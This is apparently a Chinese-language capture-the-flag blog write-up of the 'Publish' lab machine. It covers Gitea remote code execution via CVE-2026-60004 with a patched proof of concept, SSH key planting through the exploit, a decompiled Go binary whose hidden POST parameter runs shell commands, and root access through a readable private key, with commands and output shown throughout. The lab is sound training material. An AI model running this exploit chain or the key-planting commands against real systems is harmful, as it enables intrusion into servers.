---
title: "群友靶机-Publish"
date: "2026-08-15"
lastmod: "2026-08-15T00:00:00+08:00"
slug: "Publish"
summary: "第一次一血"
tags:
  - "Shell"
  - "Python"
  - "C/C++"
params:
  protected: false
  commentId: "Publish"
  legacyId: "Publish"
cover: ""
draft: false
---



# Publish

# 信息收集

## nmap

```bash

┌──(lily2663㉿LAPTOP-L8P806AH)-[~]
└─$ nmap -A 192.168.1.26
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-02 18:45 +0800
Nmap scan report for 192.168.1.26
Host is up (0.00085s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp   open  http    nginx
|_http-title: Gitea: Publish
8080/tcp open  http    Golang net/http server
|_http-title: User Query
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.0 200 OK
|     Date: Sun, 02 Aug 2026 10:45:41 GMT
|     Content-Length: 1005
|     Content-Type: text/html; charset=utf-8
|     <!DOCTYPE html>
|     <html lang="zh">
|     <head><meta charset="UTF-8"><title>User Query</title>
|     <style>
|     body{background:#1a1a2e;color:#eee;font-family:monospace;max-width:600px;margin:auto;padding:20px;}
|     input,button{width:100%;padding:10px;margin:5px 0;border:none;border-radius:5px;}
|     button{background:#e94560;color:#fff;cursor:pointer;}
|     pre{background:#16213e;padding:15px;border-radius:5px;overflow-x:auto;}
|     h2{text-align:center;color:#0f3460;}
|     .hint{background:#533483;padding:10px;border-radius:5px;margin-top:20px;font-size:0.9em;}
|     </style></head>
|     <body>
|     <h2>User Query System</h2>
|     <form action="/login" method="POST">
|     <h3>Login</h3>
|     <input type="text" name="username" placeholder="Username" required>
|     <input type="password" name="password" placeholder="Password" required>
|_    <button ty
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.99%I=7%D=8/2%Time=6A6F1FD5%P=x86_64-pc-linux-gnu%r(Get
SF:Request,463,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2002\x20Aug\x2020
SF:26\x2010:45:41\x20GMT\r\nContent-Length:\x201005\r\nContent-Type:\x20te
SF:xt/html;\x20charset=utf-8\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"zh
SF:\">\n<head><meta\x20charset=\"UTF-8\"><title>User\x20Query</title>\n<st
SF:yle>\nbody{background:#1a1a2e;color:#eee;font-family:monospace;max-widt
SF:h:600px;margin:auto;padding:20px;}\ninput,button{width:100%;padding:10p
SF:x;margin:5px\x200;border:none;border-radius:5px;}\nbutton{background:#e
SF:94560;color:#fff;cursor:pointer;}\npre{background:#16213e;padding:15px;
SF:border-radius:5px;overflow-x:auto;}\nh2{text-align:center;color:#0f3460
SF:;}\n\.hint{background:#533483;padding:10px;border-radius:5px;margin-top
SF::20px;font-size:0\.9em;}\n</style></head>\n<body>\n<h2>User\x20Query\x2
SF:0System</h2>\n<form\x20action=\"/login\"\x20method=\"POST\">\n<h3>Login
SF:</h3>\n<input\x20type=\"text\"\x20name=\"username\"\x20placeholder=\"Us
SF:ername\"\x20required>\n<input\x20type=\"password\"\x20name=\"password\"
SF:\x20placeholder=\"Password\"\x20required>\n<button\x20ty")%r(HTTPOption
SF:s,463,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2002\x20Aug\x202026\x20
SF:10:45:41\x20GMT\r\nContent-Length:\x201005\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"zh\">\n<
SF:head><meta\x20charset=\"UTF-8\"><title>User\x20Query</title>\n<style>\n
SF:body{background:#1a1a2e;color:#eee;font-family:monospace;max-width:600p
SF:x;margin:auto;padding:20px;}\ninput,button{width:100%;padding:10px;marg
SF:in:5px\x200;border:none;border-radius:5px;}\nbutton{background:#e94560;
SF:color:#fff;cursor:pointer;}\npre{background:#16213e;padding:15px;border
SF:-radius:5px;overflow-x:auto;}\nh2{text-align:center;color:#0f3460;}\n\.
SF:hint{background:#533483;padding:10px;border-radius:5px;margin-top:20px;
SF:font-size:0\.9em;}\n</style></head>\n<body>\n<h2>User\x20Query\x20Syste
SF:m</h2>\n<form\x20action=\"/login\"\x20method=\"POST\">\n<h3>Login</h3>\
SF:n<input\x20type=\"text\"\x20name=\"username\"\x20placeholder=\"Username
SF:\"\x20required>\n<input\x20type=\"password\"\x20name=\"password\"\x20pl
SF:aceholder=\"Password\"\x20required>\n<button\x20ty");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=8/2%OT=22%CT=1%CU=31475%PV=Y%DS=2%DC=T%G=Y%TM=6A6F1FF6
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=Z%TS=21)SEQ(SP=1
OS:04%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=22)SEQ(SP=104%GCD=1%ISR=107%TI=Z%CI=Z
OS:%II=I%TS=21)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=22)SEQ(SP=104%GCD
OS:=1%ISR=10A%TI=Z%CI=Z%II=I%TS=21)OPS(O1=M5B4ST11NW8%O2=M5B4ST11NW8%O3=M5B
OS:4NNT11NW8%O4=M5B4ST11NW8%O5=M5B4ST11NW8%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%
OS:W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW8%CC
OS:=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=
OS:Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=
OS:G%RUCK=A552%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUC
OS:K=A56C%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A57
OS:6%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A590%RUD
OS:=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A5AA%RUD=G)IE
OS:(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.24 ms LAPTOP-L8P806AH.mshome.net (172.22.64.1)
2   1.55 ms 192.168.1.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.48 seconds
```

80和8080都有web服务

# userflag

![1785669838784](/assets/img/1785669838784.png)

版本1.24.7

点击帮助：

![1785669868333](/assets/img/1785669868333.png)

1.27.1

## 方法一：

### 锁定漏洞cve-2026-60004  

此漏洞影响 Gitea 1.17 ~ 1.27.0，修复于 1.27.1



### 利用cve

![1785670839988](/assets/img/1785670839988.png)

寻找poc：**https://github.com/0xBlackash/CVE-2026-60004**

建私有库![1785672404365](/assets/img/1785672404365.png)

跑原版poc：

```bash
(base) PS C:\Users\lilyzero207\Desktop\测题\CVE-2026-60004> python CVE-2026-60004.py http://192.168.1.26 1 "id"
[?] password: 
[*] probing target...

  ══════════════════════════════════════════════════
  CVE-2026-60004  |  Gitea RCE via diffpatch Git Hook
  Author : Ashraf Zaryouh "0xBlackash"
  ══════════════════════════════════════════════════

  ------------------------------------------------------
  Target        : http://192.168.1.26
  Version       : 1.24.7
  Command       : id
  ------------------------------------------------------

[i] Author : Ashraf Zaryouh "0xBlackash"
[*] target=http://192.168.1.26  user=1  cmd=id

[*] authenticating...
[+] authenticated as 1
[*] creating private repository 1/poc-ef2dbe78...
[+] repository created: 1/poc-ef2dbe78
[*] submitting malicious patch (1/2)...
[-] POST /api/v1/repos/1/poc-ef2dbe78/diffpatch → HTTP 422: {"message":"[SHA]: Required","url":"http://publish.dsz/api/swagger"}
```

diffpatch 需要 base commit 的 SHA，与一般poc相比添加：

```python
client.api("POST", f"/api/v1/repos/{owner}/{repo_name}/diffpatch", {
    "content": patch,
    "sha": base_sha, # 补充了必填的上下文 Commit ID
})
```

成功执行：

```bash
[?] password: 
[*] probing target...

  ══════════════════════════════════════════════════
  CVE-2026-60004  |  Gitea RCE via diffpatch Git Hook
  Author : Ashraf Zaryouh "0xBlackash"
  ══════════════════════════════════════════════════

  ------------------------------------------------------
  Target        : http://192.168.1.26
  Version       : 1.24.7
  Command       : id
  ------------------------------------------------------

[i] Author : Ashraf Zaryouh "0xBlackash"
[*] target=http://192.168.1.26  user=1  cmd=id

[*] authenticating...
[+] authenticated as 1
[*] creating private repository 1/poc-64197800...
[+] repository created: 1/poc-64197800
[+] base SHA for diffpatch: 214e58e64ce998ee0f86ead31be682e72547bc8f
[*] submitting malicious patch (1/2)...
[*] submitting malicious patch (2/2)...
[+] patches submitted — Git hook should have executed
[*] fetching command output via smart HTTP...

uid=101(git) gid=103(git) groups=103(git)

[exit-status=0]
[+] command executed successfully

[*] evidence repo : 1/poc-64197800
[*] evidence ref  : refs/heads/poc-output-07c931
[*] Author        : Ashraf Zaryouh "0xBlackash"
```

### 建立ssh连接

随后生成公钥

```
ssh-keygen -t ed25519 -f C:\Users\lilyzero207\Desktop\测题\id_mykey
```

设置下环境变量：$env:GITEA_PASSWORD='12345678' 方便利用poc

```
python CVE-2026-60004_sha.py http://192.168.1.26 1 "mkdir -p /home/git/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDLLUMzP6dNDZOwm5YIu+eHeQOLHLJkCCfF56ZvAcTpa' > /home/git/.ssh/authorized_keys && chmod 700 /home/git/.ssh && chmod 600 /home/git/.ssh/authorized_keys && cat /home/git/.ssh/authorized_keys"
```

在服务器上创建 .ssh文件夹

把公钥写进authorized_keys

设好权限

最后把内容打印出来确认

随后ssh连接

```
ssh -i C:\Users\lilyzero207\Desktop\测题\id_mykey git@192.168.1.26
```

登陆成功

```
git@Publish:~$ 
```

Publish找不到userflag，尝试其他路

```
git@Publish:/home$ ls
git  todd
```

### 横向移动

发现存在文件main-amd64，与仓库发现的做对比

```bash
git@Publish:~$ ls -la /opt/main-amd64
-rwxr-xr-x 1 root root 13013075 Jul 28 23:44 /opt/main-amd64
git@Publish:~$ git clone http://127.0.0.1:3000/daochunhan/web-query.git /tmp/wq/repo
Cloning into '/tmp/wq/repo'...
remote: Enumerating objects: 17, done.
remote: Counting objects: 100% (17/17), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 17 (delta 3), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (17/17), 14.35 MiB | 5.78 MiB/s, done.
Resolving deltas: 100% (3/3), done.
git@Publish:~$ md5sum /opt/main-amd64 /tmp/wq/repo/main-amd64
e3d138a04d985b5431d04961cc86e4ae  /opt/main-amd64
4fa6b58c5a665b8a9f85267c39c243d3  /tmp/wq/repo/main-amd64
```

发现不同，下载到本地看，拖到ida_pro

main_searchHandler伪代码+ai注释

```c
// ============================================================
// 文件: /opt/main-amd64  (Gitea Publish 靶机 · 8080 Web 服务)
// 函数: main_searchHandler  (IDA Pro 反编译)
// 说明: 隐藏后门在函数开头，以 "POST + ll104567 参数" 触发
// ============================================================
void __golang main_searchHandler(net_http_ResponseWriter w, net_http_Request *r)
{
  string _r0_1; // rdi
  __int128 dest_1; // xmm15
  unsigned __int64 len; // rdx
  net_http_Request *r_1; // rax
  __int64 n8; // rcx
  __int64 v7; // rax
  os_exec_Cmd *_r0_2; // r8
  uint8 *str_2; // r8
  const uint8 *v10; // rbx OVERLAPPED
  __int64 v11; // rcx
  net_url_Values v12; // rax
  __int64 v13; // rax OVERLAPPED
  void *x_1; // rcx
  int len_1; // rax
  internal_abi_ITab *_r0_7; // rbx OVERLAPPED
  database_sql_Rows *_r0_5; // r11
  database_sql_Rows *rs_1; // rax
  __int64 v19; // rcx
  _BYTE v20[40]; // rdi OVERLAPPED
  interface_ *_r0_10; // rcx
  uint8 *str; // rdx
  uint8 *str_3; // rax
  __int64 n7; // rcx
  int array_1; // rbx OVERLAPPED
  uint8 *_r0_11; // rax
  char v27; // cl
  uint64 *v28; // rax
  void *x_2; // rax
  void *x_4; // rax
  __int128 *p_dest; // rbx
  __int64 n3; // rcx
  __int64 v33; // rax
  __int64 v34; // rax
  __int64 v35; // rax
  char v36; // al
  error _r1; // [rsp-46h] [rbp-128h]
  char v38; // [rsp+0h] [rbp-E2h]
  interface_ *array; // [rsp+2h] [rbp-E0h]
  database_sql_Rows *rs; // [rsp+22h] [rbp-C0h]
  uint8 *_r0; // [rsp+2Ah] [rbp-B8h]
  uint8 *str_1; // [rsp+32h] [rbp-B0h]
  uint8 *a0_8; // [rsp+3Ah] [rbp-A8h]
  _QWORD dest_4[2]; // [rsp+4Ah] [rbp-98h] BYREF
  __int128 dest; // [rsp+5Ah] [rbp-88h] BYREF
  __int128 dest_16; // [rsp+6Ah] [rbp-78h]
  __int128 dest_2; // [rsp+7Ah] [rbp-68h]
  _slice_interface_ a; // [rsp+8Ah] [rbp-58h] BYREF
  __int64 n2; // [rsp+A2h] [rbp-40h]
  __int64 v50; // [rsp+AAh] [rbp-38h]
  const uint8 *v51; // [rsp+B2h] [rbp-30h]
  void *x; // [rsp+BAh] [rbp-28h]
  void *x_3; // [rsp+C2h] [rbp-20h]
  uint64 *v54; // [rsp+CAh] [rbp-18h]
  void (**dest_3)(void); // [rsp+D2h] [rbp-10h]
  uint8 *wa; // [rsp+EAh] [rbp+8h]
  void *w_8; // [rsp+F2h] [rbp+10h]
  net_http_Request *ra; // [rsp+FAh] [rbp+18h]
  string v59; // 0:rdi.16
  string name_1; // 0:r8.16
  string _r0_4; // 0:r8.16
  string _r0_6; // 0:r8.16
  string _r0_8; // 0:r8.16
  string _r0_9; // 0:r8.16
  string _r0_3; // 0:r10.16
  string name; // 0:rax.8,8:rbx.8 OVERLAPPED
  string format; // 0:rax.8,8:rbx.8
  net_http_ResponseWriter w_2; // 0:rax.8,8:rbx.8
  net_http_ResponseWriter w_1; // 0:rax.8,8:rbx.8
  string format_1; // 0:rax.8,8:rbx.8
  _slice_string arg; // 0:rcx.8,8:rdi.16 OVERLAPPED
  _slice_interface_ v72; // 0:rcx.8,8:rdi.16
  _slice_interface_ v73; // 0:rcx.8,8:rdi.16
  main_PageData data_1; // 0:rcx.8,8:rdi.24
  main_PageData data; // 0:rcx.8,8:rdi.24

  dest_3 = (void (**)(void))dest_1;
  w_8 = w.data;
  wa = (uint8 *)w.tab;

  // ================== 后门入口 ① ==================
  // 检查请求方法是否为 "POST"（长度 4，魔数 0x54534F50）
  if ( r->Method.len == 4 )
  {
    len = r->Method.len;
    if ( !len )
      runtime_panicBounds();
    if ( len <= 1 )
      runtime_panicBounds();
    if ( len <= 2 )
      runtime_panicBounds();
    if ( len <= 3 )
      runtime_panicBounds();
    // 0x54534F50 = 'POST'（小端序）
    if ( *(_DWORD *)r->Method.str == 1414745936 )
    {
      ra = r;
      r_1 = r;
      // ================== 后门入口 ② ==================
      // 读取隐藏参数：byte_8C65B8 = "ll104567"，长度 8
      w.data = (void *)&byte_8C65B8;
      n8 = 8LL;
      net_http__ptr_Request_FormValue(r_1, *(string *)&w.data, _r0_1);
      // 参数值非空才进入命令执行分支
      if ( &byte_8C65B8 )
      {
        // ================== 后门入口 ③ ==================
        // 构造命令: exec.Command("sh", "-c", 参数值)
        n2 = 2LL;
        a.cap = (int)&stru_8C2E72.len + 6;
        v51 = &byte_8C65B8;
        v50 = v7;
        name.str = (uint8 *)&stru_8C2E72.len + 4;  // "sh"（长度 2）
        name.len = 2LL;
        arg.array = (string *)&a.cap;              // "-c"
        arg.len = 2LL;
        arg.cap = 2LL;
        os_exec_Command(name, arg, _r0_2);         // ★ 执行命令！
        os_exec__ptr_Cmd_CombinedOutput((os_exec_Cmd *)name.str, *(_slice_uint8 *)&name.len, *(error *)&arg.cap);  // 取输出
        name.len = (int)name.str;
        runtime_slicebytetostring(0LL, name.str, 2LL, *(string *)&arg.len);
        str_1 = name.str;
        name.str = (uint8 *)MEMORY[0x1A](2LL);
        arg.array = (string *)name.len;
        arg.len = (int)&byte_8C65C0;   // "\nError: " 前缀（长度 8）
        arg.cap = 8LL;
        name_1 = name;
        name.len = (int)str_1;
        runtime_concatstring3(0LL, *(string *)&name.len, *(string *)&arg.len, name_1, _r0_3);
        arg.array = 0LL;
        arg.len = 0LL;
        arg.cap = (int)name.str;
        str_2 = str_1;
        name.str = wa;
        name.len = (int)w_8;
        main_render((net_http_ResponseWriter)name, *(main_PageData *)&arg.array);
        return;   // ★ 后门分支结束，直接返回，不走正常 SQL
      }
      r = ra;
    }
  }

  // ================== 正常搜索逻辑（后门没触发才走这里）==================
  net_url__ptr_URL_Query(r->URL, (net_url_Values)w.data);
  v10 = &byte_8EEC30;
  v11 = 1LL;
  net_url_Values_Get(v12, *(string *)&v10, _r0_1);
  if ( &byte_8EEC30 )
  {
    *(_OWORD *)&a.array = dest_1;
    runtime_convTstring(*(string *)&v13, x_1);
    a.array = (interface_ *)&e;
    a.len = len_1;
    format.str = (uint8 *)"SELECT id, username, password FROM user WHERE username LIKE '%%%s%%'";
    format.len = 68LL;
    v72.array = (interface_ *)&a;
    v72.len = 1LL;
    v72.cap = 1LL;
    fmt_Sprintf(format, v72, _r0_4);
    a0_8 = format.str;
    *(_QWORD *)v20 = format.str;
    *(_QWORD *)&v20[8] = 68LL;
    *(_QWORD *)&v20[16] = 0LL;
    *(_QWORD *)&v20[24] = 0LL;
    *(_QWORD *)&v20[32] = 0LL;
    _r0_7 = (internal_abi_ITab *)&go_itab_context_backgroundCtx_comma_context_Context;
    v72.array = (interface_ *)&regexp_arrayNoInts;
    database_sql__ptr_DB_QueryContext(
      main_db,
      *(context_Context *)&_r0_7,
      *(string *)v20,
      *(_slice_interface_ *)&v20[16],
      _r0_5,
      _r1);
    if ( &go_itab_context_backgroundCtx_comma_context_Context )
    {
      str_3 = (uint8 *)((__int64 (__golang *)(__int64))go_itab_context_backgroundCtx_comma_context_Context.Fun[0])(v19);
      n7 = 7LL;
      v59.str = str_3;
      v59.len = (int)&go_itab_context_backgroundCtx_comma_context_Context;
      array_1 = (int)&byte_8C5452;
      runtime_concatstring2(0LL, *(string *)&array_1, v59, _r0_6);
      v27 = 0;
    }
    else
    {
      rs = rs_1;
      dest_4[0] = main_searchHandler_deferwrap1;
      dest_4[1] = rs_1;
      dest_3 = (void (**)(void))dest_4;
      _r0_10 = 0LL;
      str = 0LL;
      while ( 1 )
      {
        array = _r0_10;
        _r0 = str;
        database_sql__ptr_Rows_Next(rs_1, (bool)_r0_7);
        if ( !v36 )
          break;
        runtime_newobject((internal_abi_Type *)&typ_, _r0_7);
        v54 = v28;
        runtime_newobject((internal_abi_Type *)&e, _r0_7);
        x = x_2;
        runtime_newobject((internal_abi_Type *)&e, _r0_7);
        x_3 = x_4;
        *(_QWORD *)&dest = &stru_81BC20;
        *((_QWORD *)&dest + 1) = v54;
        *(_QWORD *)&dest_16 = &::dest;
        *((_QWORD *)&dest_16 + 1) = x;
        *(_QWORD *)&dest_2 = &::dest;
        *((_QWORD *)&dest_2 + 1) = x_4;
        p_dest = &dest;
        n3 = 3LL;
        *(_QWORD *)v20 = 3LL;
        database_sql__ptr_Rows_Scan(rs, *(_slice_interface_ *)&v20[-16], *(error *)&v20[8]);
        dest = dest_1;
        dest_16 = dest_1;
        dest_2 = dest_1;
        runtime_convT64(*v54, &dest);
        *(_QWORD *)&dest = &typ_;
        *((_QWORD *)&dest + 1) = v33;
        runtime_convTstring(*(string *)x, x);
        *(_QWORD *)&dest_16 = &e;
        *((_QWORD *)&dest_16 + 1) = v34;
        runtime_convTstring(*(string *)x_3, x_3);
        *(_QWORD *)&dest_2 = &e;
        *((_QWORD *)&dest_2 + 1) = v35;
        format_1.str = (uint8 *)&byte_8C98C3;
        format_1.len = 13LL;
        v73.array = (interface_ *)&dest;
        v73.len = 3LL;
        v73.cap = 3LL;
        fmt_Sprintf(format_1, v73, _r0_8);
        v73.array = array;
        *(_QWORD *)v20 = format_1.str;
        *(_QWORD *)&v20[8] = 13LL;
        _r0_7 = (internal_abi_ITab *)_r0;
        runtime_concatstring2(0LL, *(string *)&_r0_7, *(string *)v20, _r0_9);
        _r0_10 = (interface_ *)_r0;
        str = format_1.str;
        rs_1 = rs;
      }
      array_1 = (int)array;
      if ( !array )
        array_1 = 11LL;
      _r0_11 = _r0;
      if ( !array )
        _r0_11 = (uint8 *)"No results.";
      v27 = 1;
    }
    v38 = v27;
    data.Query.str = a0_8;
    data.Query.len = 68LL;
    data.Result.str = _r0_11;
    data.Result.len = array_1;
    w_1.tab = (internal_abi_ITab *)wa;
    w_1.data = w_8;
    main_render(w_1, data);
    if ( (v38 & 1) != 0 )
      (*dest_3)();
  }
  else
  {
    w_2.tab = (internal_abi_ITab *)wa;
    w_2.data = w_8;
    data_1.Query.str = 0LL;
    data_1.Query.len = 0LL;
    data_1.Result.str = (uint8 *)"Please provide a search term.";
    data_1.Result.len = 29LL;
    main_render(w_2, data_1);
  }
}

```

![1785674398796](/assets/img/1785674398796.png)

发现参数l104567

构造命令：

```
curl -s -X POST "http://127.0.0.1:8080/search" --data-urlencode "ll104567=id"
```

```
curl -s -X POST "http://127.0.0.1:8080/search" --data-urlencode "ll104567=cat /home/todd/user.txt"
```

直接读到了

```
</body></html>gcurl -s -X POST "http://127.0.0.1:8080/search" --data-urlencode "ll104567=cat /home/todd/user.txt"todd/user.txt"
<!DOCTYPE html>
<html lang="zh">
<head><meta charset="UTF-8"><title>User Query</title>
<style>
body{background:#1a1a2e;color:#eee;font-family:monospace;max-width:600px;margin:auto;padding:20px;}
input,button{width:100%;padding:10px;margin:5px 0;border:none;border-radius:5px;}
button{background:#e94560;color:#fff;cursor:pointer;}
pre{background:#16213e;padding:15px;border-radius:5px;overflow-x:auto;}
h2{text-align:center;color:#0f3460;}
.hint{background:#533483;padding:10px;border-radius:5px;margin-top:20px;font-size:0.9em;}
</style></head>
<body>
<h2>User Query System</h2>
<form action="/login" method="POST">
<h3>Login</h3>
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button>
</form>
<form action="/search" method="GET">
<h3>Search Users</h3>
<input type="text" name="q" placeholder="Search keyword" required>
<button type="submit">Search</button>
</form>

<pre>flag{user-71e8307f0001862b3dede2da14ed38be}
</pre>
```

接下来按照之前的操作登录todd

```
curl -s -X POST "http://127.0.0.1:8080/search" --data-urlencode "ll104567=mkdir -p /home/todd/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDLLUMzP6dNDZOwm5YIu+eHeQOLHLJkCCfF56ZvAcTpa' > /home/todd/.ssh/authorized_keys && chmod 700 /home/todd/.ssh && chmod 600 /home/todd/.ssh/authorized_keys"
```

```
ssh -i C:\Users\lilyzero207\Desktop\测题\id_mykey todd@192.168.1.26
```

登陆成功

## 方法二：

http://192.168.1.26/daochunhan/web-query/releases发现：![1785676866790](/assets/img/Publish.assets/1785676866790.png)

下载下来发现main-amd64就是服务器上的main-amd64，于是与上述后续流程一致

不要随意相信release！！！！！



# rootflag

```
ls -la /home/todd/.ssh/
```

发现私钥id_rsa

直接连

```
todd@Publish:~$ ssh -i /home/todd/.ssh/id_rsa root@127.0.0.1
Linux Publish 7.1.5-1-liquorix-amd64 #1 ZEN SMP PREEMPT liquorix 7.1-6.1~trixie (2026-07-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jul 28 23:59:17 2026 from ::1
root@Publish:~# cat /root/root.txt
flag{root-093a441b0ca7c95a566ce26bba74b00b}
```

